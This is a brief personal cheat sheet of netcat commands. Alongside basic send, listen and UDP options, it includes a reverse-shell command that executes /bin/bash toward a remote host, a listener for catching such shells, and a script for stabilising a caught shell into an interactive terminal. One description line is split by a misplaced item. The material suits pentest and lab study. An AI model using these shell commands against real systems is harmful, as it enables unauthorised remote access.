# All of my used comamnds in netcat

- `echo hello | nc <ip> <port>` send the output of echo by tcp packets to the specified ip and port
- `nc <ip> <port> -e /bin/bash` specify which program to execute after connect to a host
- `nc -l -p <port>` Listen for incoming packets from the specified port
- `nc -l -n -p <port>` Do not do any DNS or service lookups on any specified addresses, hostnames or

* `nc -lnvp <port>` listens to a port for backward connection
  ports while listening

- `nc -u` use UDP packets instead of tcp

## Shell Stabilization script

```bash
python -c "import pty;pty.spawn('/bin/bash')"
# ctrl+z
stty raw -echo
# type fg to regain the netcat shell and press some enters
export TERM=xterm
```
